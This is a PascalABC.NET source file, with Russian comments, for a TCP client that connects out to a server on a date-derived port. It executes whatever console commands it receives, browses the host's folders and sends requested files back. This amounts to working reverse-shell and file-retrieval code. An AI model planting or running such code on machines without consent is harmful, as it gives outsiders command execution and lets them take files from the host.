﻿unit client;

uses 
  System.Net.Sockets, 
  System.Threading, 
  System.Text, 
  System.Net, 
  System.IO,
  System, 
  Newtonsoft.Json,
  types, cmd;

type
  TClient = class 
    
    public AppIsRunning: boolean;
    
    public next, prev: TClient; 
    public ip: string;
    public client: TcpClient;
    public stream: NetworkStream;
    public retry: byte;
    public port: integer;
    public path, epath: string;
    
    public _pp_service: Thread;
    
    public constructor(ip: string);
    begin
      self.AppIsRunning := true;
      self.ip := ip; 
      self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
      self._pp_service := new Thread(PPService);
    end;
    
    
    public constructor(ip: string; port: integer; clnt: TcpClient);
    begin
      self.AppIsRunning := true;
      self.client := clnt;
      self.client.Client.ReceiveTimeout := 100;
      self.ip := ip;
      self.port := port;
      self._pp_service := new Thread(PPService);
    end;
    
    
    public function ConnectedMsg(): string;
    begin
      if self.client = nil then
        Result := 'Сервер не отвечает!' else 
        Result := 'Подключение установлено!';
    end;
    
    
    public procedure Connect();
    begin
      Thread.Create(
        () -> begin
        while self.retry < MAX_RETRIES do
        begin
          try
            self.client := new TcpClient(self.ip, self.port);
            self.client.Client.ReceiveTimeout := 100;
            self.client.SendTimeout := 4000;
            self.client.ReceiveTimeout := 4000;
            self._pp_service.Start();
            cmd.CD();
            self.path := cmd.output;
            self.epath := self.path;
            break; // Если подключились, выходим из цикла
          except
            Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
          end;
          Inc(self.retry);
        end;
      end).Start();
      
    end;
    
    
    public procedure Disconnect();
    begin
      if (self.client <> nil) and (self.client.Connected) then begin
        self.client.Close();
        self.client.Dispose();
        self.client := nil;
        self._pp_service.Suspend();
      end;
    end;
    
    
    public procedure KillAllServices();
    begin
      // Устанавливаем флаг остановки
      AppIsRunning := false;
      
      // Ждем завершения всех потоков
      foreach var service in [self._pp_service] do
      begin
        if (service <> nil) and service.IsAlive then begin
          service.Join(1000); // Даем 1 секунду на завершение
          if service.IsAlive then
            service.Abort(); // Принудительное завершение, если не ответил
        end;
      end;
      
    end;
    
    
    async procedure PPService();
    begin
      stream := self.client.GetStream();
      var data: array of byte;
      while self.AppIsRunning do
      begin
        if stream.DataAvailable then begin
          SetLength(data, self.client.ReceiveBufferSize);
          
          var len := stream.Read(data, 0, data.Length);
          
          if len = 0 then 
            self.AppIsRunning := false; 
          var message := Encoding.UTF8.GetString(data, 0, len);
          
          if message = 'PING' then 
            message := 'PONG' else 
          if message = GETPATH then
            message := self.path else 
          if message.StartsWith('E@') then 
            message := ExplorerHandler(message) else 
            message := ConsoleHandler(message);
          
          data := Encoding.UTF8.GetBytes(message);
          stream.Write(data, 0, data.Length);
          
        end
      end;
      
      stream.Close(100);
      
    end;
    
    /// Обработка полученных запросов от консоли
    function ConsoleHandler(msg: string): string;
    begin
      var responce: string;
      
      cmd.run(msg);
      responce := cmd.output;
      
      if responce.StartsWith('cd>') then begin
        responce := responce.Substring(3);
        self.path := responce;
      end;
      
      Result := responce;
    end;  
    
    /// Обработка полученных запросов от проводника
    function ExplorerHandler(msg: string): string;
    begin
      var responce: string = msg;
      
      try
        case msg.Substring(0, 3) of
          E_GET_PATH: 
            responce := self.epath;
          E_GET_DIRS: 
            responce := JsonConvert.SerializeObject(Directory.GetDirectories(self.epath));
          E_GET_FILES:
            responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
          E_ARROW_UP:
            begin
              if Directory.GetDirectoryRoot(self.epath) = self.epath + SLASH then exit;
              self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
              
              if Directory.GetDirectoryRoot(path) = self.epath + SLASH then 
                self.epath += SLASH;
              responce := self.epath;
            end;
          E_ENTER_FOLDER:
          begin
            if Directory.EnumerateDirectories(self.epath, msg.Substring(3), SearchOption.TopDirectoryOnly).Count() > 0 then begin
              try 
                var tempPath := self.epath + SLASH + msg.Substring(3);
                Directory.GetDirectories(tempPath);
                self.epath := tempPath;
              except on e: Exception do 
                responce := E_ERROR_OPEN_FOLDER + #10 + E.Message;
              end; // try
            end;
          end; 
          E_RECEIVE_FILE:
            begin
              var filePath := self.epath + SLASH + msg.Substring(3);
              var FStream: FileStream := System.IO.File.OpenRead(filePath);
              
              // Получение размера файла
              var fileSize := FStream.Length;
              var sizeBuffer := System.BitConverter.GetBytes(fileSize); // 8 байт Int64
              
              // Отправка 8 байт с размером файла
              stream.Write(sizeBuffer, 0, sizeBuffer.Length);
              
              // Отправка файла по частям
              var buffer := new byte[4096];
              var bytesRead := 0;
              
              repeat
                bytesRead := FStream.Read(buffer, 0, buffer.Length);
                if bytesRead > 0 then
                  stream.Write(buffer, 0, bytesRead);
              until bytesRead = 0;
              
              FStream.Close();
              
              // Отправка финального подтверждения (по желанию)
              responce := E_FILE_SUCCESSFULLY_TRANSFERRED;                         
            end;    
        
        end; // case
      finally
        Result := responce;
      end; 
    end;    
  
  
  end; // class

end.
